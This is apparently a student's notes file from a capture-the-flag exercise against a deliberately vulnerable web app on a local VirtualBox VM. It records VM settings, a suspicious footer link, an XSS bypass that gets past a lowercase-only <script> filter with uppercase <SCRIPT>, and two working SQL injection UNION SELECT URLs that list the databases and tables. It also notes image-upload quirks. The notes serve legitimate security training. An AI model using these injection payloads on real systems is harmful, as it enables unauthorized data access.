# VirtualBox settings
1. System->Processor-> enable PAE
2. Host-only Adapter, name vboxnet0

# Notes to self
## Footer
* The copyright link points to ?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c (the albatross page), which feels odd (64 characters, too)

## Feedback
* The **name** field allows HTML injection~~, but not XSS. Simply adding a `<script>` block does not return a flag (the tags are filtered out).~~
* Actually XSS **is** possible, it's just `<script>` (lowercase) tags that are filtered. `<SCRIPT>` works fine.

## Database
* There are 5 databases (+ information_schema):
  * `Member_Brute_Force, Member_Sql_Injection, Member_guestbook, Member_images, Member_survey`
  * http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+catalog_name%2C+schema_name+FROM+information_schema.schemata&Submit=Submit#
* The databases contain the following tables:
  * Member_Brute_Force: db_default
  * Member_Sql_Injection: users
  * Member_guestbook: guestbook
  * Member_images: list_images
  * Member_survey: vote_dbs
  * http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_schema%2C+table_name+FROM+information_schema.tables&Submit=Submit#
* The database uses InnoDB

## Image upload
* Hidden input field MAX_FILE_SIZE sounds like a constant that should be on the server.
* Files must be jpg/jpeg (probably)
* Images are not added to database even if successfully uploaded (at least not `list_images`)

# Flag count
6/14
